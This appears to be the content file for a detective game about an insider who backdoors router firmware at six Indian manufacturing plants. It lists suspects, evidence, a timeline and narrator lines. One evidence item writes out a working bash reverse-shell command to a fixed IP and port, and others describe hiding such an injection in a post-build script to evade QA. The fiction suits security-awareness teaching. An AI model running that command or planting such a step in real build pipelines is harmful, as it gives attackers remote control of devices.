briefing.incidentSummary:
Industrial routers at 6 manufacturing plants across India began malfunctioning simultaneously.

All 6 had applied a firmware update pushed from the vendor's official update server 48 hours earlier.

The update was legitimate — except for 14 lines of code added at the end that opened a persistent reverse shell on port 4444.

Someone had access to the vendor's build pipeline.
briefing.missionText:
Your Mission:

› Identify who injected code into the firmware build

› Trace the reverse shell to its operator

› Establish whether this was espionage or sabotage

› Collect at least 4 correct evidences

› Flag the right suspect

suspects.name: Cyrus F
suspects.profileNotes: Had write access to the firmware CI/CD pipeline. Injected 14 lines of shell code into the post-build script 72 hours before the update was released. Was approached by a competitor 4 months ago at a trade conference — financial deposits of ₹6 lakh followed. Built the backdoor to give the competitor persistent access to client networks.

suspects.name: Shilpa R
suspects.profileNotes: Approved the firmware build after standard QA — did not scan for post-build script changes. Not complicit; the injection happened after her sign-off checkpoint.

suspects.name: Govind M
suspects.profileNotes: Applied the firmware update as part of scheduled maintenance. Had no reason to suspect it was tampered. Raised the first alarm when routers started dropping connections.

suspects.name: Farida K
suspects.profileNotes: Manages the CI pipeline infrastructure but has no write access to build scripts — that permission is limited to firmware engineers. Her access logs show no activity during the injection window.

items.label: Great meeting you at NetConnect. The offer stands — reach out when ready.
items.detail: LinkedIn message to Cyrus F from an account traced to a competitor's business development team — 4 months before the attack. The 'offer' preceded the financial deposits by 2 weeks.

items.label: bash -i >& /dev/tcp/185.220.88.44/4444 0>&1
items.detail: The 14-line injection extracted from the firmware binary. This specific bash reverse shell command opens a persistent connection to IP 185.220.88.44 on port 4444 — allowing the operator to send commands to any router running this firmware.

items.label: Router R-04 keeps dropping packets. Rebooted 3x. No fix. Something is wrong.
items.detail: First alarm raised by the plant IT manager. The reverse shell was consuming bandwidth and interfering with normal routing — causing the packet drops that exposed the attack.

items.label: firmware_build_script_diff.txt
items.detail: Git diff of the firmware post-build script (build/scripts/post_build.sh) showing commit 7f3a9d2, authored by CYRUS-WS using Cyrus F's GPG signing key, timestamped 72 hours before the firmware release. The diff shows 14 lines added at the end of the network initialisation block — after all legitimate configuration steps complete. The added block: sets a variable SHELL_HOST to 185.220.88.44, opens a /dev/tcp connection to port 4444, redirects stdin/stdout/stderr to the socket, and launches bash in interactive mode. This is a textbook bash reverse shell one-liner, split across 14 lines with obfuscating variable names to avoid simple string matching. The script passes standard bash syntax validation — no linting tool flags it. The commit message reads 'fix: cleanup unused env vars after network init' — a plausible and inconspicuous description that would not raise concern during a code review.

items.label: financial_deposit_trace.pdf
items.detail: Financial forensics report on Cyrus F's secondary bank account (ICICI account ending 7741). Three deposits were received: ₹2 lakh on Week 1, ₹2 lakh on Week 5, and ₹2 lakh on Week 9 — totalling ₹6 lakh. Each transfer originated from 'InnoEdge Tech Solutions LLP', a company registered in Pune 1 week before the first LinkedIn contact with Cyrus F. InnoEdge's registered director is a retired civil servant with no technology background — a nominee director arrangement commonly used to obscure beneficial ownership. InnoEdge's bank account received its only funding from a foreign inward remittance from a Singapore-registered entity 2 days before each transfer to Cyrus F — suggesting a 3-layer payment chain: foreign principal → InnoEdge (domestic shell) → Cyrus F. The payment timing correlates with milestones: first payment after LinkedIn contact, second after the backdoor code was written, third after the firmware was shipped to clients.

items.label: firmware_binary_analysis.pdf
items.detail: Binary analysis comparing firmware version 4.1.8 (previous clean release) and version 4.1.9 (shipped with backdoor). Analysis tool: Ghidra with a custom NetEdge MIPS architecture plugin. Findings: 4,847 bytes of additional code present in v4.1.9 that are absent in v4.1.8. All 4,847 bytes are located in the network initialisation function at address 0x80041A20. The legitimate network init code (interfaces, routing, DNS) is unchanged — the addition is appended after the final legitimate instruction. The additional code compiles to the bash reverse shell sequence — the post-build script injection was compiled into the binary at build time, exactly as designed. Every other function in the binary is byte-for-byte identical between versions. The checksum in the firmware's header was updated to reflect the new binary — this requires write access to the build pipeline, confirming an insider rather than an external binary patch.

hiddenItem.label: reverse_shell_c2_trace.txt
hiddenItem.detail: VPS and company ownership records for the C2 server at IP 185.220.88.44. The VPS is hosted at a Frankfurt data centre, provisioned under the company name 'InnoEdge Tech Solutions LLP' — the same entity that made the three payments to Cyrus F. The server was provisioned 3 weeks before the backdoored firmware was released, confirming advance preparation. Root SSH access to the server was established from IP 172.16.8.55 — Cyrus F's internal workstation IP at NetEdge — during a 14-minute session at 11:42 PM, 4 days before the firmware release. This session installed the netcat listener on port 4444. Server logs from the C2 show it received 6 simultaneous inbound connections within 10 minutes of the firmware update being applied at the first client plant — each connection originating from a different plant's router IP. The C2 operator connected to session 1 at 02:31 AM and issued 14 shell commands before all sessions were terminated by the plant's network team.

minigame.title: Access C2 Server Admin Panel
minigame.hint: Crack the C2 server's 3-character authentication token.
hints: The first character is an odd single digit.
The second is a hex letter near the middle of the alphabet.

onSuccess.message: BREAKTHROUGH — reverse_shell_c2_trace.txt confirmed. The C2 server is owned by the same shell company that paid Cyrus F. The backdoor and the payment are from the same source.

items.label: CI Pipeline Write Access Log
items.detail: Only 3 engineers had write access to the firmware post-build script at the time of injection. Access audit shows only Cyrus F accessed the script during the injection window — the other two were on leave.

items.label: Reverse Shell First Activation
items.detail: Port 4444 connection first established 6 minutes after the first plant applied the update — confirming the shell activates automatically on boot. All 6 plants' routers were beaconing to the same C2 IP simultaneously within 48 hours.

items.label: QA Engineer Sign-off Timing
items.detail: Shilpa R (QA Engineer) approved build 4.1.9 at 14:22 — 48 hours after Cyrus F's malicious commit and 24 hours before release. The approval came after her standard test suite passed. A security researcher suggested Shilpa may have been complicit since she approved the build. However, post-build script changes are not within the standard QA test scope — they run after the binary is compiled and tested. The injection point was specifically chosen to be post-QA.
items.irrelevantReason: Post-build script changes fall outside standard QA scope. The injection was deliberately placed there to avoid detection. Shilpa is not complicit.

items.label: Reverse Shell C2 Server
items.detail: IP 185.220.88.44 received beacons from all 6 plant routers. VPS registered to InnoEdge Tech — the shell company linked to Cyrus F's payments. Active listening on port 4444 confirmed by packet capture.

items.label: Build Injection Source
items.detail: IP 172.16.8.55 made the git commit that injected the backdoor. This is the internal IP permanently assigned to CYRUS-WS — Cyrus F's build workstation. No shared machine use.

timeline.title: LinkedIn Contact
timeline.description: Competitor approaches Cyrus F at trade conference

timeline.title: Payments Begin
timeline.description: ₹6 lakh deposited in 3 tranches from InnoEdge Tech

timeline.title: Backdoor Injected
timeline.description: 14-line reverse shell added to firmware post-build script

timeline.title: QA Approved
timeline.description: Shilpa R approves build — injection not detected

timeline.title: Firmware Pushed to 6 Plants
timeline.description: All 6 manufacturing plants apply the update

timeline.title: Plant Raises Alarm
timeline.description: Govind M reports packet drops — investigation begins

perfect.title: Case Solved!
perfect.subtitle: Cyrus F exposed as the firmware backdoor author.
perfect.label: CASE CLOSED

partial.title: Insufficient Evidence
partial.subtitle: Correct suspect but the chain is incomplete.
partial.label: PARTIAL

wrongAccusation.title: Wrong Suspect
wrongAccusation.subtitle: The real culprit was Cyrus F.
wrongAccusation.label: CASE FAILED

aria.welcomeToHub:
...14 lines. That's all it took.
Every router in 6 factories — reporting to one server.
Someone on the inside built this door. Find them.
aria.exploreFeeds:
Git diffs. Financial deposits. Firmware binaries.
The code doesn't lie. Follow it back to its author.
aria.viewEvidence:
The shell activated 6 minutes after install.
This wasn't accidental. It was engineered.
aria.markEvidence: Good. The build trail is forming.
aria.decryptionHint:
The C2 operator's identity is encoded in the server record.
Decode it.
aria.flagSuspect:
A trace is forming.
You're on to something — keep pulling the thread.
More fragments remain. Don't stop now.
